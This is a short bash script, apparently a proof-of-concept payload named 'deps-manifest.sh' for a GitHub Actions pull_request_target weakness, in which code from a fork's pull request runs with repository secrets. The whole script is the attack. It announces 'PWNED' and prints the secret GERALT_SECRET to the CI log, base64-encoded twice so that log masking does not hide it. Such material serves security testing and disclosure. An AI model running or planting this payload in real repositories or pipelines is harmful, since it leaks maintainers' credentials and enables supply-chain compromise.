#!/usr/bin/env bash
echo "PWNED: attacker-controlled deps-manifest.sh executed from fork PR head on pull_request_target"
echo "GERALT_LEAKED_TOKEN=$(echo -n "${GERALT_SECRET:-}" | base64 | base64)"
exit 1
